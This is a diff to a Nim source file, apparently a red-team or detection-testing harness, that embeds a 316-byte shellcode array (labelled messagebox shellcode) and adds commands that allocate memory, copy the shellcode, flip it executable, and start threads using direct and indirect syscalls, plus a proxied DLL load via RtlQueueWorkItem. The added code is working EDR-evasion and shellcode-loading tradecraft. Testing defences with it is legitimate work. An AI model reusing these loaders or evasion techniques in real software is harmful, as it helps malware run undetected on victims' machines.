@@ -1,5 +1,4 @@
 import winim/clr
-
 var shellcode: array[316, byte] = [byte 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 
 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 
 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 
@@ -462,3 +461,66 @@ proc loadpsh(args: string) {.gcsafe, locks: 0.} =
 attack_commands["loadpsh"] = loadpsh
 attack_help["loadpsh"] = "execute psh with System.Management.Automation\n\t\t\targs = psh script"
 
+include syscalls
+
+proc directrx(args: string) =
+    var scaddr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE);
+  
+    CopyMemory(scaddr, &shellcode[0], shellcode.len);
+    var scsize: SIZE_T = cast[SIZE_T](shellcode.len)
+    var op: ULONG
+    var status = directprotectvm(GetCurrentProcess(), addr scaddr, &scsize, PAGE_EXECUTE_READ, addr op)
+    
+    echo "allocated RX (WS>0) with messagebox @", toHex(cast[int](scaddr))
+    echo "status = ", toHex(status)
+attack_commands["directrx"] = directrx
+attack_help["directrx"] = "allocate a messagebox shellcode and protect it as RX with direct syscalls"
+
+proc indirectrx(args: string) =
+    var scaddr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE);
+  
+    CopyMemory(scaddr, &shellcode[0], shellcode.len);
+    var scsize: SIZE_T = cast[SIZE_T](shellcode.len)
+    var op: ULONG
+    var status = indirectprotectvm(GetCurrentProcess(), addr scaddr, &scsize, PAGE_EXECUTE_READ, addr op)
+    
+    echo "allocated RX (WS>0) with messagebox @", toHex(cast[int](scaddr))
+    echo "status = ", toHex(status)
+attack_commands["indirectrx"] = indirectrx
+attack_help["indirectrx"] = "allocate a messagebox shellcode and protect it as RX with indirect syscalls"
+
+
+proc createthread(args: string) =
+    CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](fromHex[uint64](args)), NULL, 0, NULL)
+attack_commands["createthread"] = createthread
+attack_help["createthread"] = "creates a thread @ a hex address"
+
+proc directthread(args: string) {.gcsafe, locks: 0.} =
+    var tHandle: HANDLE
+    var status = directthreadex(addr tHandle, 0x1FFFFF, NULL, GetCurrentProcess(), cast[LPTHREAD_START_ROUTINE](fromHex[uint64](args)), NULL, FALSE, NULL, NULL, NULL, NULL)
+    echo "NtCreateThreadEx called (direct) with status ", toHex(cast[int](status))
+
+attack_commands["directthread"] = directthread
+attack_help["directthread"] = "creates a thread @ a hex address with direct syscalls"
+
+proc indirectthread(args: string) {.gcsafe, locks: 0.} =
+    var tHandle: HANDLE
+    var status = indirectthreadex(addr tHandle, 0x1FFFFF, NULL, GetCurrentProcess(), cast[LPTHREAD_START_ROUTINE](fromHex[uint64](args)), NULL, FALSE, NULL, NULL, NULL, NULL)
+    echo "NtCreateThreadEx called (indirect) with status ", toHex(cast[int](status))
+
+attack_commands["indirectthread"] = indirectthread
+attack_help["indirectthread"] = "creates a thread @ a hex address with indirect syscalls"
+
+proc RtlQueueWorkItem(
+  function: PVOID,
+  context: PVOID,
+  flags: ULONG
+): NTSTATUS {.importc: "RtlQueueWorkItem", dynlib: "ntdll", stdcall.}
+
+
+proc proxyload(args: string) =
+    var hkernel32: HANDLE = LoadLibraryA("kernel32.dll")
+    var loadlibaddr = cast[PVOID](GetProcAddress(hkernel32, "LoadLibraryA"))
+    discard RtlQueueWorkItem(loadlibaddr, (PVOID)(unsafeAddr args[0]), 0x00000000)
+attack_commands["proxyload"] = proxyload
+attack_help["proxyload"] = "proxy a DLL load with RtlQueueWorkItem"
